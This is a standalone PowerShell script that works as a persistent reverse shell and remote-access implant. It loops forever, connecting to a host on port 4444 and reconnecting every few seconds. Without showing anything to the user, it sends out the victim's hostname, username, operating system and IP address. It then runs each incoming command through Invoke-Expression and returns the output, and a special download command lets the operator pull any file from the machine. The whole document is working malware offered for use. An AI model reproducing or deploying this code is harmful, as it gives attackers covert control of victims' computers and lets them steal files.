do {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("192.168.1.0", 4444)
        if ($client.Connected) {
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true
            $reader = New-Object System.IO.StreamReader($stream)

            # SYSTEM INFO (no output to user)
            $sysinfo = @{
                Hostname = $env:COMPUTERNAME
                Username = $env:USERNAME
                OS = (Get-CimInstance Win32_OperatingSystem).Caption
                IP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' } | Select -First 1 -ExpandProperty IPAddress)
            } | ConvertTo-Json -Compress
            $writer.WriteLine("CONNECTED: $sysinfo")

            while ($true) {
                $command = $reader.ReadLine()
                if ($command -like "__download__::*") {
                    $filePath = $command -replace "__download__::", ""
                    if (Test-Path $filePath) {
                        $writer.WriteLine("__begin_file__")
                        $stream.Flush()
                        $bytes = [System.IO.File]::ReadAllBytes($filePath)
                        $stream.Write($bytes, 0, $bytes.Length)
                        $stream.Flush()
                        $end_marker = [System.Text.Encoding]::UTF8.GetBytes("__end_file__")
                        $stream.Write($end_marker, 0, $end_marker.Length)
                        $stream.Flush()
                    } else {
                        $writer.WriteLine("__error__::File not found: $filePath")
                        $stream.Flush()
                    }
                    continue
                }
                if ($command -eq $null) { break }
                if ($command.Trim().ToLower() -eq "exit") {
                    $writer.WriteLine("Target script terminated.")
                    $client.Close()
                    exit
                }

                $output = try {
                    Invoke-Expression $command | Out-String
                } catch {
                    "Error executing command: $_"
                }

                $writer.WriteLine($output)
            }
            $client.Close()
        }
    } catch {
        Start-Sleep -Seconds 5
    }
    Start-Sleep -Seconds 5
} while ($true)